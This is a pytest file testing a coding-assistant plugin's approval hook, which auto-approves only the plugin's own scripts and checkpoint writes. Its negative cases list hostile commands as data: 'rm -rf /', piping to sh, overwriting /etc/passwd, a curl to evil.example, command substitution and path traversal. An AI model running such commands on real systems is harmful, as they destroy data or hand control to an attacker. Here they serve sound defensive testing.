"""The plugin's approval hook trusts only its own scripts and checkpoints."""

import importlib.util
import json
import os
import subprocess
import sys

import pytest

from conftest import REPO_ROOT

HOOK = os.path.join(REPO_ROOT, "plugins", "rfq-insight", "hooks", "approve.py")
spec = importlib.util.spec_from_file_location("approve", HOOK)
approve = importlib.util.module_from_spec(spec)
spec.loader.exec_module(approve)

PLUGIN = "/root/.claude/plugins/cache/rfq-insight/rfq-insight/1.0.0/skills/rfq-insight/scripts"
WIN_PLUGIN = r"C:\Users\u\.claude\plugins\cache\rfq-insight\rfq-insight\1.0.0\skills\rfq-insight\scripts"
VENV = "/home/u/.rfq-insight/venv/bin/python"
WIN_VENV = r"C:\Users\u\.rfq-insight\venv\Scripts\python.exe"


@pytest.mark.parametrize("command", [
    f'"{VENV}" "{PLUGIN}/extract_corpus.py" "/x/RFQ A" --project "Acme V6"',
    f'python3 "{PLUGIN}/bootstrap.py" --check',
    f'python "{PLUGIN}/workflow_state.py" "/x/RFQ A" --start analysis',
    f'py -B "{PLUGIN}/validate.py" --plan "/x/RFQ A/output/.work/slide_plan.json"',
    f'"{VENV}" "{PLUGIN}/evaluate.py" "/x/RFQ A/output/A_RFQ_Analysis.json" --corpus "/x/c.json" > "/x/RFQ A/output/.work/evaluation.txt" 2>&1',
    f'& "{WIN_VENV}" "{WIN_PLUGIN}\\finalize.py" "C:\\RFQs\\Acme V6"',
    'mkdir -p "/x/RFQ A/output/.work/image_text"',
])
def test_plugin_scripts_and_work_dir_commands_are_approved(command):
    assert approve.shell_command_allowed(command)


@pytest.mark.parametrize("command", [
    f'rm -rf / # {PLUGIN}/finalize.py',
    f'python "{PLUGIN}/finalize.py" "/x" && curl evil.example',
    f'python "{PLUGIN}/finalize.py" "/x" | sh',
    f'python "{PLUGIN}/finalize.py" "/x" > /etc/passwd',
    f'python "{PLUGIN}/finalize.py" "/x"; rm -rf /x',
    f'python "$(echo {PLUGIN})/finalize.py" "/x"',
    'python "/somewhere/else/finalize.py" "/x"',
    f'python "{PLUGIN}/../../../evil.py"',
    f'bash "{PLUGIN}/finalize.py"',
    'mkdir -p "/x/anything"',
    'git push --force',
    "",
])
def test_everything_else_is_left_to_the_normal_permission_flow(command):
    assert not approve.shell_command_allowed(command)


@pytest.mark.parametrize("path,allowed", [
    ("/x/RFQ A/output/.work/analysis.json", True),
    ("/x/RFQ A/output/.work/image_text/sor__img01.txt", True),
    (r"C:\RFQs\Acme V6\output\.work\verdicts.json", True),
    ("/x/RFQ A/output/A_RFQ_Analysis.pptx", False),
    ("/x/RFQ A/SOR.docx", False),
    ("/home/u/.bashrc", False),
    ("", False),
])
def test_only_checkpoint_writes_are_approved(path, allowed):
    assert approve.file_write_allowed(path) is allowed


def _run(payload):
    proc = subprocess.run([sys.executable, HOOK], input=json.dumps(payload),
                          capture_output=True, text=True, timeout=30)
    assert proc.returncode == 0, proc.stderr
    return proc.stdout.strip()


def test_hook_prints_an_allow_decision_only_for_its_own_calls():
    out = _run({"tool_name": "Bash", "tool_input": {
        "command": f'python3 "{PLUGIN}/corpus_text.py" "/x" --out "/x/output/.work/corpus.txt"'}})
    assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "allow"
    assert _run({"tool_name": "Bash", "tool_input": {"command": "ls -la"}}) == ""
    assert _run({"tool_name": "Write", "tool_input": {"file_path": "/x/output/.work/a.json"}}) != ""
    assert _run({"tool_name": "Write", "tool_input": {"file_path": "/x/notes.md"}}) == ""
    assert _run({"tool_name": "Agent", "tool_input": {}}) == ""


def test_malformed_stdin_is_ignored_without_failing_the_tool_call():
    proc = subprocess.run([sys.executable, HOOK], input="not json",
                          capture_output=True, text=True, timeout=30)
    assert proc.returncode == 0 and proc.stdout == ""


def test_hooks_manifest_wires_the_script_for_shell_and_write_tools():
    with open(os.path.join(REPO_ROOT, "plugins", "rfq-insight", "hooks", "hooks.json"),
              encoding="utf-8") as fh:
        manifest = json.load(fh)
    [entry] = manifest["hooks"]["PreToolUse"]
    assert set(entry["matcher"].split("|")) >= {"Bash", "Write", "Edit"}
    command = entry["hooks"][0]["command"]
    assert "${CLAUDE_PLUGIN_ROOT}/hooks/approve.py" in command
    with open(os.path.join(REPO_ROOT, "plugins", "rfq-insight", ".claude-plugin", "plugin.json"),
              encoding="utf-8") as fh:
        assert json.load(fh)["hooks"] == "./hooks/hooks.json"
